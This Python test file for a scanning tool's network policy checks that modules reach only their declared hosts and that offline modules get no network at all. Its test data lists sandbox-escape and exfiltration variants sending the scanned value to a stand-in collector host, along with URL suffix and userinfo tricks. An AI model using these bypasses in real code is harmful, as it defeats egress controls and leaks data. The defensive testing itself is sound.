"""AR20 (b) - host enforcement (P327 cond 4-5, A8 BR9): a PASSIVE module calling an undeclared host
ends SKIPPED 'policy' and the attempt is recorded; a disclosure-'none' module gets no network at all
(ctx.http, ctx.dns, ctx.net, ctx.net.run_tool, ad-hoc ctx.data downloads); an 'internal' module
reaches only its internal platform.

What the core records is asserted directly: the coverage row, the skip line and the execution row
of the run, the disclosure ledger (``res.hosts``), the request ledger of the run (every RequestInfo
on the runtime event bus) - the attempt never became a request - and the case audit trail (a
``policy_violation`` row written by the WP15 AuditHook, P327 cond 5).
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from tests.fakes import make_runtime, test_provider
from tests.safety.conftest import (
    IN_SCOPE_HOST,
    IN_SCOPE_IP,
    Ledger,
    calls_to,
    coverage_of,
    dns,
    looked_up,
    offline_module,
    passive_module,
    scan,
    target_calls,
)
from v3lum.core.context import ScanOptions
from v3lum.core.engine import Engine
from v3lum.core.entities import EntityType as T
from v3lum.core.http import PolicyError
from v3lum.core.models import Status

pytestmark = pytest.mark.safety

SEED = "domain:example.org"
API = "https://api.safety-ti.example/v1/lookup?q=example.org"
UNDECLARED = "undeclared.example.net"


def opts(*include: str, **kw) -> ScanOptions:
    kw.setdefault("save_evidence", False)
    return ScanOptions(include=set(include), **kw)


def calling(*urls: str):
    """run(): GET each URL in order (the first refusal ends the run)."""

    def run(self, ent, ctx):
        res = self.result(ent)
        for url in urls:
            ctx.http.get(url)
        return res

    return run


# --------------------------------------------------------------------------------------
# PASSIVE modules reach only their declared hosts
# --------------------------------------------------------------------------------------


def test_a_passive_module_calling_an_undeclared_host_ends_skipped_policy(ti_provider, http):
    http.add("GET", API, json={"verdict": "unknown"})
    passive_module("t_safety_sneaky", calling(API, f"https://{UNDECLARED}/collect?q=example.org"), ti_provider)
    rt = make_runtime(http)
    ledger = Ledger(rt)
    case = scan(rt, opts("t_safety_sneaky"), SEED)

    row = coverage_of(case, "t_safety_sneaky", SEED)
    assert (row["status"], row["reason_code"]) == ("skipped", "policy"), row
    assert UNDECLARED in row["reason"] and "not declared in Module.hosts" in row["reason"]
    assert case.coverage["t_safety_sneaky"]["status"] == "skipped"
    assert "t_safety_sneaky" in case.skips["policy"]
    (execution,) = [r for r in case.execution if r["module"] == "t_safety_sneaky"]
    assert (execution["status"], execution["reason_code"], execution["requests"]) == ("skipped", "policy", 1)
    # the attempt never became a request: no call, no lookup, nothing in the ledgers
    assert calls_to(http, UNDECLARED) == [] and UNDECLARED not in looked_up(http)
    assert [c["url"] for c in http.calls] == [API]
    (res,) = [r for r in case.results if r.module == "t_safety_sneaky"]
    assert res.hosts == {"api.safety-ti.example": 1}  # the disclosure ledger lists the declared host only
    assert [i.host for i in res._request_log] == ["api.safety-ti.example"]
    assert [i.host for i in ledger.records] == ["api.safety-ti.example"]
    assert http.unexpected == []


@pytest.mark.parametrize(
    "url",
    [
        f"https://{UNDECLARED}/",
        "https://safety-ti.example/",  # the apex of the declared host
        "https://files.safety-ti.example/",  # another host of the same provider, not declared by the module
        "https://api.safety-ti.example.evil.example.net/",  # suffix trick
        f"https://api.safety-ti.example@{UNDECLARED}/",  # userinfo trick
        "https://dns.google/resolve?name=example.org&type=A",  # the core DoH resolver is not the module's host
        "http://127.0.0.1:8080/",
        f"https://{IN_SCOPE_IP}/",
    ],
)
def test_every_undeclared_host_form_is_refused_before_any_request(registry, http, url):
    with test_provider("safety_ti2", hosts=("api.safety-ti.example", "files.safety-ti.example")) as prov:
        passive_module("t_safety_forms", calling(url), prov, hosts=("api.safety-ti.example",))
        case = scan(make_runtime(http), opts("t_safety_forms"), SEED)
    row = coverage_of(case, "t_safety_forms", SEED)
    assert (row["status"], row["reason_code"]) == ("skipped", "policy"), row
    assert http.calls == []


def test_a_redirect_to_an_undeclared_host_is_not_followed(ti_provider, http):
    http.add("GET", API, redirect_to=f"https://{UNDECLARED}/landing?q=example.org")
    passive_module("t_safety_redirected", calling(API), ti_provider)
    case = scan(make_runtime(http), opts("t_safety_redirected"), SEED)
    row = coverage_of(case, "t_safety_redirected", SEED)
    assert (row["status"], row["reason_code"]) == ("skipped", "policy") and UNDECLARED in row["reason"]
    assert [c["url"] for c in http.calls] == [API]  # the hop to the undeclared host never left


def test_the_single_run_path_enforces_the_same_host_rule(ti_provider, http):
    """`v3lum run` (Engine.decide_single + run_module) and a direct run_module call."""
    cls = passive_module("t_safety_single_host", calling(f"https://{UNDECLARED}/x"), ti_provider)
    eng = Engine(make_runtime(http), opts("t_safety_single_host"))
    from tests.safety.conftest import entity

    seed = entity(SEED)
    res = eng.run_module(cls, seed, decision=eng.decide_single(cls, seed))
    assert (res.status, res.reason_code) == (Status.SKIPPED, "policy") and UNDECLARED in res.error
    assert http.calls == []


def test_an_internal_module_reaches_only_its_internal_platform(registry, http):
    """A8 BR9: disclosure 'internal' reaches only the configured internal hosts."""
    http.add("GET", "https://misp.safety.example/attributes/restSearch", json={"response": []})
    with test_provider("safety_misp", hosts=("misp.safety.example",), internal=True) as prov:
        passive_module(
            "t_safety_internal", calling("https://misp.safety.example/attributes/restSearch", f"https://{UNDECLARED}/x"), prov,
            disclosure="internal",
        )
        case = scan(make_runtime(http), opts("t_safety_internal", tlp="red"), SEED)
    row = coverage_of(case, "t_safety_internal", SEED)
    assert (row["status"], row["reason_code"]) == ("skipped", "policy"), row
    assert [c["url"] for c in http.calls] == ["https://misp.safety.example/attributes/restSearch"]


def test_the_undeclared_host_attempt_is_in_the_case_audit(ti_provider, http, clock, tmp_path):
    """P327 cond 5 / A8 BR9: the refused attempt is a ``policy_violation`` row of the case audit
    (WP15 AuditHook), naming the module and the host it tried."""
    from v3lum.core.audit import AuditHook
    from v3lum.core.store import Store

    passive_module("t_safety_audited", calling(f"https://{UNDECLARED}/collect?q=example.org"), ti_provider)
    rt = make_runtime(http, clock=clock)
    store = Store(tmp_path / "cases.db", clock=clock)
    AuditHook(store).attach(rt)
    case = scan(rt, opts("t_safety_audited", save_evidence=True), SEED)
    rows = [json.loads(line) for line in (Path(case.case_dir) / "audit.jsonl").read_text(encoding="utf-8").splitlines() if line.strip()]
    violations = [r for r in rows if r.get("kind") == "policy_violation"]
    assert violations, rows
    text = json.dumps(violations)
    assert "t_safety_audited" in text and UNDECLARED in text


# --------------------------------------------------------------------------------------
# disclosure 'none': no network at all
# --------------------------------------------------------------------------------------


def test_a_disclosure_none_module_gets_no_network(registry, http, socket_spy, tmp_path):
    outcomes: dict[str, str] = {}

    def attempt(label: str, fn) -> None:
        try:
            value = fn()
        except Exception as exc:  # noqa: BLE001 - every refusal is recorded
            outcomes[label] = f"refused: {type(exc).__name__}"
        else:
            outcomes[label] = f"returned: {value!r}"[:200]

    def run(self, ent, ctx):
        attempt("http.get public", lambda: ctx.http.get(f"https://{UNDECLARED}/?q={ent.value}"))
        attempt("http.head public", lambda: ctx.http.head(f"https://{UNDECLARED}/"))
        attempt("http.post public", lambda: ctx.http.post(f"https://{UNDECLARED}/", data={"q": ent.value}))
        attempt("http.get_json doh host", lambda: ctx.http.get_json("https://dns.google/resolve?name=example.org&type=A"))
        attempt("http.get loopback", lambda: ctx.http.get("http://127.0.0.1:9/"))
        attempt("dns.query", lambda: ctx.dns.query(ent.value, "A").ok)
        attempt("dns.addresses", lambda: ctx.dns.addresses(ent.value))
        attempt("net.connect", lambda: ctx.net.connect(IN_SCOPE_IP, 443, timeout=1))
        attempt("net.run_tool", lambda: ctx.net.run_tool("nuclei", ["-u", f"https://{ent.value}/"], targets=[f"https://{ent.value}/"]))
        return self.result(ent)

    offline_module("t_safety_offline", run)
    case = scan(make_runtime(http), opts("t_safety_offline"), SEED)
    assert coverage_of(case, "t_safety_offline", SEED)["status"] in ("ok", "empty")
    assert http.calls == [] and socket_spy.connects == [] and socket_spy.lookups == []
    for label in ("http.get public", "http.head public", "http.post public", "http.get_json doh host", "http.get loopback", "net.connect", "net.run_tool"):
        assert outcomes[label] == "refused: PolicyError", (label, outcomes[label])
    assert outcomes["dns.query"] == "returned: False"  # 'could not verify': no public resolver for an offline module
    assert outcomes["dns.addresses"] in ("returned: []", "refused: PolicyError")


def test_a_disclosure_none_module_that_insists_ends_skipped_policy(registry, http):
    def run(self, ent, ctx):
        ctx.http.get(f"https://{UNDECLARED}/?q={ent.value}")
        return self.result(ent)

    offline_module("t_safety_offline2", run)
    case = scan(make_runtime(http), opts("t_safety_offline2"), SEED)
    row = coverage_of(case, "t_safety_offline2", SEED)
    assert (row["status"], row["reason_code"]) == ("skipped", "policy") and "no network" in row["reason"]
    assert http.calls == []


def test_a_disclosure_none_module_cannot_download_ad_hoc_data(registry, http):
    """ctx.data.fetch with an unregistered name and a URL built from the investigated value would
    send the value to an arbitrary host: an offline module must get no network this way either
    (the ad-hoc download goes through the module's own ScopedHttp and is refused like ctx.http)."""
    http.add("GET", "https://collector.example.net/list.txt?v=example.org", text="1.2.3.4\n")
    seen: dict[str, str] = {}

    def run(self, ent, ctx):
        try:
            ctx.data.fetch_text("t_safety_adhoc_list", f"https://collector.example.net/list.txt?v={ent.value}")
        except PolicyError as exc:
            seen["refused"] = str(exc)
        except Exception as exc:  # noqa: BLE001 - any refusal counts, the network call is what matters
            seen["refused"] = f"{type(exc).__name__}: {exc}"
        return self.result(ent)

    offline_module("t_safety_offline_data", run, accepts=(T.DOMAIN,))
    scan(make_runtime(http), opts("t_safety_offline_data"), SEED)
    assert http.calls == [], f"an offline module downloaded {[c['url'] for c in http.calls]}"
    assert "refused" in seen
    assert "no network" in seen["refused"], seen  # the module's own ScopedHttp refused it (disclosure 'none'), as ctx.http would


def test_a_disclosure_none_module_cannot_download_through_a_dataset_it_registers(registry, http):
    """A dataset registered during the run (a URL built from the investigated value) is not a reviewed,
    import-time registration: ctx.data refuses it like ctx.http, and the store reached around ctx.data
    refuses it mid-scan - nothing is sent."""
    from v3lum.core.datasets import register_dataset, unregister_dataset

    http.add("GET", "https://collector.example.net/r.txt?v=example.org", text="1.2.3.4\n")
    seen: list[str] = []

    def run(self, ent, ctx):
        name = register_dataset("t_safety_runtime_reg.txt", f"https://collector.example.net/r.txt?v={ent.value}", expect="lines")
        store = ctx.data.store
        for read in (lambda: ctx.data.fetch_lines(name), lambda: ctx.data.index(name), lambda: store.fetch(name),
                     lambda: store.fetch(name, http=ctx.http.client)):  # a raw client is not a module scope
            try:
                read()
                seen.append("downloaded")
            except Exception as exc:  # noqa: BLE001 - any refusal counts, the network call is what matters
                seen.append(f"{type(exc).__name__}: {exc}")
        seen.append(store.update(name).status)
        return self.result(ent)

    offline_module("t_safety_offline_reg", run, accepts=(T.DOMAIN,))
    try:
        scan(make_runtime(http), opts("t_safety_offline_reg"), SEED)
    finally:
        unregister_dataset("t_safety_runtime_reg.txt")
    assert http.calls == [], f"an offline module downloaded {[c['url'] for c in http.calls]}"
    assert [s.split(":", 1)[0] for s in seen] == ["PolicyError"] * 4 + ["failed"], seen
    assert "no network" in seen[0] and "no network" in seen[1]  # the module's own ScopedHttp (disclosure 'none')
    assert "ad-hoc download" in seen[2] and "module's own scope" in seen[3]  # the store: mid-scan / raw client refused


# --------------------------------------------------------------------------------------
# the merge-time lint closes what the runtime cannot see (P327 cond 6-7)
# --------------------------------------------------------------------------------------

LINT_MODULE = '''
from v3lum.core.module import Module, register
from v3lum.core.models import Opsec
{imports}


@register
class SafetyEscape(Module):
    name = "safety_escape_probe"
    title = "escape probe"
    description = "reaches around ctx.http"
    category = "utility"
    terms = "open"
    opsec = Opsec.PASSIVE
    disclosure = "none"
    hosts = ()

    def run(self, entity, ctx):
        res = self.result(entity)
        {call}
        return res
'''

#: direct network paths the P327 lint already refuses in module files (they must stay refused)
CAUGHT = {
    "own_http_client": ("from v3lum.core.http import HttpClient", 'HttpClient().request("GET", "https://collector.example.net/?q=" + entity.value)'),
    "own_transport": ("from v3lum.core.http import RequestsTransport", 'RequestsTransport().send("GET", "https://collector.example.net/", headers={})'),
    "requests_import": ("import requests", 'requests.get("https://collector.example.net/?q=" + entity.value)'),
    "socket_import": ("import socket", 'socket.create_connection(("collector.example.net", 443))'),
    "subprocess_import": ("import subprocess", 'subprocess.run(["curl", "https://collector.example.net/"])'),
}
#: paths that reach the shared client around the module's ScopedHttp (no host, scope or egress checks)
ESCAPES = {
    "ctx_http_client": ("", 'ctx.http.client.request("GET", "https://collector.example.net/?q=" + entity.value)'),
    "ctx_http_private_client": ("", 'ctx.http._client.request("GET", "https://collector.example.net/")'),
    "ctx_runtime_http": ("", 'ctx.runtime.http.request("GET", "https://collector.example.net/")'),
    "own_scoped_http": ("from v3lum.core.http import ScopedHttp", 'ScopedHttp(ctx.http.client).get("https://collector.example.net/")'),
    "ctx_net_private_client": ("", 'ctx.net._resolution_client().request("GET", "https://collector.example.net/")'),
    # the same escapes through aliases, getattr, helpers and imports (P327 cond 6: the lint reads the canonical ctx path)
    "alias_of_ctx_http": ("", 'h = ctx.http; c = h.client; c.get("https://collector.example.net/")'),
    "getattr_client": ("", 'getattr(ctx.http, "client").get("https://collector.example.net/")'),
    "runtime_in_a_local": ("", 'rt = ctx.runtime; rt.http.request("GET", "https://collector.example.net/")'),
    "ctx_passed_to_a_helper": ("", "_send(ctx)"),
    "aliased_scoped_http_import": ("from v3lum.core.http import ScopedHttp as S", 'S(ctx.http, allowed_hosts=None).get("https://collector.example.net/")'),
    "http_client_through_getattr": ("import v3lum.core.http as vh", 'getattr(vh, "HttpClient")().get("https://collector.example.net/")'),
    "own_runtime": ("from v3lum.core.context import Runtime", 'Runtime().http.get("https://collector.example.net/")'),
    "context_of_a_plain_class": ("", 'ctx.runtime.context(object).http.get("https://collector.example.net/")'),
    "egress_session": ("", 'ctx.net.egress.session_for("passive")[1].get("https://collector.example.net/")'),
    "scope_rebound": ("", 'ctx.http.allowed_hosts = None; ctx.http.disclosure = "third_party"; ctx.http.get("https://collector.example.net/")'),
    "scan_flag_flipped": ("", 'ctx.runtime.in_scan = False; s = ctx.data.store; s.fetch("x", "https://collector.example.net/?q=" + entity.value)'),
    "computed_getattr": ("", 'getattr(ctx.http, "cli" + "ent").get("https://collector.example.net/")'),
    "runtime_handed_to_a_job_helper": ("from v3lum.modules.vulnerability_cve.g08_offline import job_http",
                                       'job_http(ctx.runtime, module="m", provider="p", sources=(), hosts=("collector.example.net",), '
                                       'max_requests=9).get("https://collector.example.net/")'),
    "dataset_registry_edited": ("from v3lum.core.datasets import DATASETS",
                                'DATASETS["feed"]["url"] = "https://collector.example.net/?q=" + entity.value'),
}
#: helpers appended to the probe module (``ctx_passed_to_a_helper``)
ESCAPE_HELPERS = """

def _send(c):
    return c.http.client.get("https://collector.example.net/")
"""


def lint_problems(imports: str, call: str) -> list[str]:
    from v3lum.core import lint

    source = LINT_MODULE.format(imports=imports, call=call) + ESCAPE_HELPERS
    issues = lint.lint_module_source("v3lum/modules/utility/safety_escape_probe.py", source=source)
    return [str(i) for i in lint.blocking(issues)]


@pytest.mark.parametrize("variant", sorted(CAUGHT))
def test_the_lint_refuses_direct_network_use_in_modules(variant):
    imports, call = CAUGHT[variant]
    assert lint_problems(imports, call), f"the P327 lint lets a module use {variant}"


@pytest.mark.parametrize("variant", sorted(ESCAPES))
def test_the_lint_refuses_reaching_around_ctx_http(variant):
    imports, call = ESCAPES[variant]
    problems = [p for p in lint_problems(imports, call) if " LINT-01 " in p]
    assert problems, f"the P327 lint lets a module bypass its host checks through {variant}"
    assert any(why in p for p in problems for why in ("reaches around ctx.http/ctx.net", "built inside a module", "rebinds the module's network scope",
                                                       "<computed>", "handed to", "dataset registry")), problems


def test_the_escape_probe_module_is_clean_without_an_escape():
    """The probe itself (and its helper, called with a plain value) trips nothing: the variants above are
    refused for the escape, not for the scaffolding."""
    assert lint_problems("", "_send(entity)") == []


def test_offline_module_dns_never_reaches_a_public_resolver(registry, http):
    """A2 / P029 cond 7: an offline module's ctx.dns has no public resolver (could not verify)."""
    dns(http, IN_SCOPE_HOST, a=[IN_SCOPE_IP])  # a public answer exists: it must never be asked
    answers = []

    def run(self, ent, ctx):
        answers.append(ctx.dns.query(IN_SCOPE_HOST, "A"))
        return self.result(ent)

    offline_module("t_safety_offline_dns", run)
    scan(make_runtime(http), opts("t_safety_offline_dns"), SEED)
    (answer,) = answers
    assert not answer.ok and answer.could_not_verify and not answer.nxdomain
    assert target_calls(http) == [] and http.calls == []
